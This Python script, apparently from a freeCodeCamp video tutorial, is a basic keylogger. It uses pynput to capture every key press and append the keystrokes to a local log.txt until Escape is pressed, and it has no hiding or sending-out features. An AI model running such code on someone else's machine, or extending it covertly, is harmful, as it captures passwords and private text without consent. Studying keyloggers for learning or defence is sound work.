# tutorial code from https://youtu.be/TbMKwl11itQ
# YT Video Name: Create a Keylogger with Python - Tutorial
# YT Video Author: freeCodeCamp.org
# Code by: desbeth

# MAKE SURE PYNPUT IS INSTALLED BEFORE RUNNING THIS! OPTIONS DOWN BELOW!
# https://pypi.org/project/pynput/
# pip install pynput in Terminal

# worked as of 2/7/2022

from pynput.keyboard import Key, Listener

count = 0  # count variable will be every so many keys it will rewrite the text file
keys = ['\nNew Session \n']  # creates a new line at the start of each Run


def on_press(key):
    """
    on_press takes key, from pynput, and records and stores the keys into an array of keys.
    Every 10 characters, log.txt gets updated with the keys from the array.
    """
    global keys, count

    keys.append(key)
    count += 1
    # print("{}".format(key)) # if you choose to de-comment this, it will display each key in the Run terminal

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(writing_keys):
    """
    Opens up a file, "log.txt", and writes the keys to the file. Depending on which button is pressed will result
    in different spaces or new lines. For example, the space bar prints an actual space button. The enter button creates
    a new line, and any other letter or numeric key are recorded.
    *** my goal is eventually to get a working Key.backspace key.
    """
    with open("log.txt", "a") as f:  # first time you run it, if it's not created, 'w' works fine, but then after that,
        for key in writing_keys:  # you have to use 'a'
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    """
    By pressing the escape key, one is able to stop the key-logging process, but before it stops it writes the recorded
    keys to log.txt.
    """
    if key == Key.esc:
        write_file(keys)
        return False


def main():
    """
    Uses the imported Listener from pynput
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
